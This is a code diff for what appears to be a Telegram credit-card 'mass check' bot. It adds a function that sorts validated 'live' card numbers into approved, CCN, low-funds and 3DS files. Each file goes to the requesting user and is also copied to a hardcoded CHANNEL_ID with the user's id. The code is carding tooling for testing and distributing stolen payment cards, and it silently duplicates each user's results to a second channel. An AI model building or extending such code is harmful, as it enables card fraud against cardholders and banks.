@@ -576,6 +576,149 @@ def run_mass_check_thread(bot, message, allowed_users=None):
 
 
 # ================================================================
+# 📂 HELPER FUNCTION: Send separate files by status category
+# ================================================================
+def send_separate_status_files(bot, chat_id, live_cc_results, live_count, is_stopped=False):
+    """
+    Categorize live CCs by status and send separate files for:
+    - Approved (CVV/APPROVED)
+    - CCN
+    - Low Funds (Insufficient/LOW)
+    - 3DS
+    
+    Only sends files that contain cards.
+    """
+    # Categorize cards by status
+    approved_cards = []
+    ccn_cards = []
+    low_funds_cards = []
+    threed_cards = []
+    
+    for e in live_cc_results:
+        status = e.get('status', '').upper()
+        # Categorize by status - check in order of specificity
+        if '3DS' in status:
+            threed_cards.append(e)
+        elif 'CCN' in status:
+            ccn_cards.append(e)
+        elif 'INSUFFICIENT' in status or 'LOW FUNDS' in status or (status.startswith('LOW') and 'FUND' in status):
+            low_funds_cards.append(e)
+        elif 'APPROVED' in status or 'CVV' in status:
+            approved_cards.append(e)
+    
+    # Send files only for categories that have cards
+    files_sent = []
+    base_prefix = "🛑" if is_stopped else "✅"
+    base_suffix = " (Stopped Early)" if is_stopped else ""
+    
+    # Approved file
+    if approved_cards:
+        output_file = f"live_ccs_{chat_id}_approved.txt"
+        with open(output_file, "w", encoding="utf-8") as f:
+            for e in approved_cards:
+                f.write(f"{e['cc']}|{e.get('bank', '-')}|{e.get('country', '-')} ({e['status']})\n")
+        
+        if os.path.exists(output_file):
+            try:
+                with open(output_file, "rb") as f:
+                    caption = f"{base_prefix} {len(approved_cards)} Approved CCs Found{base_suffix}"
+                    bot.send_document(chat_id, f, caption=caption)
+                    try:
+                        f.seek(0)
+                        bot.send_document(CHANNEL_ID, f, caption=f"{base_prefix} {len(approved_cards)} Approved CCs Found{base_suffix} (User {chat_id})")
+                    except Exception as e:
+                        logger.warning(f"[CHANNEL APPROVED SEND ERROR] {e}")
+            except Exception as e:
+                logger.warning(f"[APPROVED SEND DOC ERROR] {e}")
+            finally:
+                try:
+                    os.remove(output_file)
+                except Exception:
+                    pass
+            files_sent.append("Approved")
+    
+    # CCN file
+    if ccn_cards:
+        output_file = f"live_ccs_{chat_id}_ccn.txt"
+        with open(output_file, "w", encoding="utf-8") as f:
+            for e in ccn_cards:
+                f.write(f"{e['cc']}|{e.get('bank', '-')}|{e.get('country', '-')} ({e['status']})\n")
+        
+        if os.path.exists(output_file):
+            try:
+                with open(output_file, "rb") as f:
+                    caption = f"{base_prefix} {len(ccn_cards)} CCN CCs Found{base_suffix}"
+                    bot.send_document(chat_id, f, caption=caption)
+                    try:
+                        f.seek(0)
+                        bot.send_document(CHANNEL_ID, f, caption=f"{base_prefix} {len(ccn_cards)} CCN CCs Found{base_suffix} (User {chat_id})")
+                    except Exception as e:
+                        logger.warning(f"[CHANNEL CCN SEND ERROR] {e}")
+            except Exception as e:
+                logger.warning(f"[CCN SEND DOC ERROR] {e}")
+            finally:
+                try:
+                    os.remove(output_file)
+                except Exception:
+                    pass
+            files_sent.append("CCN")
+    
+    # Low Funds file
+    if low_funds_cards:
+        output_file = f"live_ccs_{chat_id}_lowfunds.txt"
+        with open(output_file, "w", encoding="utf-8") as f:
+            for e in low_funds_cards:
+                f.write(f"{e['cc']}|{e.get('bank', '-')}|{e.get('country', '-')} ({e['status']})\n")
+        
+        if os.path.exists(output_file):
+            try:
+                with open(output_file, "rb") as f:
+                    caption = f"{base_prefix} {len(low_funds_cards)} Low Funds CCs Found{base_suffix}"
+                    bot.send_document(chat_id, f, caption=caption)
+                    try:
+                        f.seek(0)
+                        bot.send_document(CHANNEL_ID, f, caption=f"{base_prefix} {len(low_funds_cards)} Low Funds CCs Found{base_suffix} (User {chat_id})")
+                    except Exception as e:
+                        logger.warning(f"[CHANNEL LOW FUNDS SEND ERROR] {e}")
+            except Exception as e:
+                logger.warning(f"[LOW FUNDS SEND DOC ERROR] {e}")
+            finally:
+                try:
+                    os.remove(output_file)
+                except Exception:
+                    pass
+            files_sent.append("Low Funds")
+    
+    # 3DS file
+    if threed_cards:
+        output_file = f"live_ccs_{chat_id}_3ds.txt"
+        with open(output_file, "w", encoding="utf-8") as f:
+            for e in threed_cards:
+                f.write(f"{e['cc']}|{e.get('bank', '-')}|{e.get('country', '-')} ({e['status']})\n")
+        
+        if os.path.exists(output_file):
+            try:
+                with open(output_file, "rb") as f:
+                    caption = f"{base_prefix} {len(threed_cards)} 3DS CCs Found{base_suffix}"
+                    bot.send_document(chat_id, f, caption=caption)
+                    try:
+                        f.seek(0)
+                        bot.send_document(CHANNEL_ID, f, caption=f"{base_prefix} {len(threed_cards)} 3DS CCs Found{base_suffix} (User {chat_id})")
+                    except Exception as e:
+                        logger.warning(f"[CHANNEL 3DS SEND ERROR] {e}")
+            except Exception as e:
+                logger.warning(f"[3DS SEND DOC ERROR] {e}")
+            finally:
+                try:
+                    os.remove(output_file)
+                except Exception:
+                    pass
+            files_sent.append("3DS")
+    
+    return files_sent
+
+
+# ================================================================
 # 📂 MAIN MASS CHECK HANDLER (implementation)
 # ================================================================
 def _handle_file_impl(bot, message, allowed_users):
@@ -1382,24 +1525,10 @@ def _handle_file_impl(bot, message, allowed_users):
                 except Exception as e:
                     logger.warning(f"[STOP SUMMARY ERROR] {e}")
 
-                # Send partial lives
+                # Send partial lives - separate files by status
                 if live_count > 0:
-                    output_file = f"live_ccs_{chat_id}_results.txt"
-                    with open(output_file, "w", encoding="utf-8") as f:
-                        for e in live_cc_results:
-                            f.write(f"{e['cc']}|{e.get('bank', '-')}|{e.get('country', '-')} ({e['status']})\n")
-                    try:
-                        with open(output_file, "rb") as f:
-                            caption = f"🛑 {live_count} Live CCs Found (Stopped Early)"
-                            bot.send_document(chat_id, f, caption=caption)
-                            try:
-                                f.seek(0)
-                                bot.send_document(CHANNEL_ID, f, caption=f"🛑 {live_count} Live CCs Found (Stopped Early, User {chat_id})")
-                            except Exception as e:
-                                logger.warning(f"[CHANNEL STOP SEND ERROR] {e}")
-                                                        
-                    except Exception as e:
-                        logger.warning(f"[STOP SEND DOC ERROR] {e}")
+                    wait_for_live_queue_flush(live_count, targets=(chat_id, CHANNEL_ID))
+                    send_separate_status_files(bot, chat_id, live_cc_results, live_count, is_stopped=True)
 
                     # 🕐 Wait before deleting raw result files
                     logger.info(f"[STOP CLEANUP] Waiting 5s before deleting raw files for {chat_id}")
@@ -1410,11 +1539,6 @@ def _handle_file_impl(bot, message, allowed_users):
                         logger.info(f"[STOP CLEANUP] Deleted raw files for {chat_id}")
                     except Exception as e:
                         logger.warning(f"[STOP CLEANUP ERROR] {e}")
-
-                    try:
-                        os.remove(output_file)
-                    except Exception:
-                        pass
 
                 # ✅ Unpin and delete progress board on stop
                 try:
@@ -1482,7 +1606,7 @@ def _handle_file_impl(bot, message, allowed_users):
             cleanup_all_raw_files(chat_id)
 
 
-            # Send results file
+            # Send results file - separate files by status
             if live_count > 0:
                 wait_for_live_queue_flush(live_count, targets=(chat_id, CHANNEL_ID))
                 try:
@@ -1490,28 +1614,7 @@ def _handle_file_impl(bot, message, allowed_users):
                 except Exception:
                     pass
 
-                output_file = f"live_ccs_{chat_id}_results.txt"
-                with open(output_file, "w", encoding="utf-8") as f:
-                    for e in live_cc_results:
-                        f.write(f"{e['cc']}|{e.get('bank', '-')}|{e.get('country', '-')} ({e['status']})\n")
-
-                if os.path.exists(output_file):
-                    try:
-                        with open(output_file, "rb") as f:
-                            caption = f"✅ {live_count} Live CCs Found"
-                            bot.send_document(chat_id, f, caption=caption)
-                            try:
-                                f.seek(0)
-                                bot.send_document(CHANNEL_ID, f, caption=f"🛑 {live_count} Live CCs Found (User {chat_id})")
-                            except Exception as e:
-                                logger.warning(f"[CHANNEL STOP SEND ERROR] {e}")
-                                                        
-                    except Exception:
-                        pass
-                    try:
-                        os.remove(output_file)
-                    except Exception:
-                        pass
+                send_separate_status_files(bot, chat_id, live_cc_results, live_count, is_stopped=False)
             else:
                 try:
                     bot.send_message(chat_id, f"{summary}\nNo live CCs found.", parse_mode="HTML")
